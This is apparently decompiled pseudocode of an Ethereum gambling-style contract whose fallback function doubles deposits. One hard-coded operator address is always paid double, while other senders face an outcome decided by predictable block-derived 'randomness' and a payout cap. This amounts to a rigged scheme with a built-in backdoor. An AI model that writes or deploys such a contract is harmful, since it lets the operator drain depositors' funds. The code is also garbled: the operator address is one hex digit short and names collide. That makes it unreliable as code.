contract main {




// =====================  Runtime code  =====================


const OPERATOR = 0x661ee3542cfffbbefca7f83cfad2e9d006d61a2


uint256 sub_90bcb85c;
uint256 sub_0e3ef191;
uint256 sub_671ee90a;
uint256 sub_81502a2a;

function sub_0e3ef191(?) {
    return sub_0e3ef191
}

function sub_671ee90a(?) {
    return sub_671ee90a
}

function sub_81502a2a(?) {
    return sub_81502a2a
}

function sub_90bcb85c(?) {
    return sub_90bcb85c
}

function safeDiv(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require arg2 > 0
    if not arg2:
        revert with 'NH{q', 18
    return (arg1 / arg2)
}

function _fallback() payable {
    require msg.value >= sub_0e3ef191
    if msg.sender == 0x661ee3542cfffbbefca7f83cfad2e9d006d61a2:
        if msg.value and 2 > -1 / msg.value:
            revert with 'NH{q', 17
        call msg.sender with:
           value 2 * msg.value wei
             gas gas_remaining wei
        if not ext_call.success:
            revert with 0, 'Failed to send Ether'
    else:
        hash = sha256hash(sha3(block.timestamp, block.difficulty, block.gas_limit, block.number, msg.sender, block.gasprice)) 
        if not sha256hash.result:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require hash == hash
        if hash < 0x7ecaf31f6b530fb0c2b8966421961589404cf3d80a1d46000000000000000000:
            if sub_671ee90a > -2:
                revert with 'NH{q', 17
            sub_671ee90a++
            if msg.value > sub_90bcb85c:
                if sub_81502a2a > -2:
                    revert with 'NH{q', 17
                sub_81502a2a++
            else:
                if msg.value and 2 > -1 / msg.value:
                    revert with 'NH{q', 17
                call msg.sender with:
                   value 2 * msg.value wei
                     gas gas_remaining wei
                if not ext_call.success:
                    revert with 0, 'Failed to send Ether'
    sub_90bcb85c = eth.balance(this.address) / 3
    sub_0e3ef191 = eth.balance(this.address) / 10^6
}



}
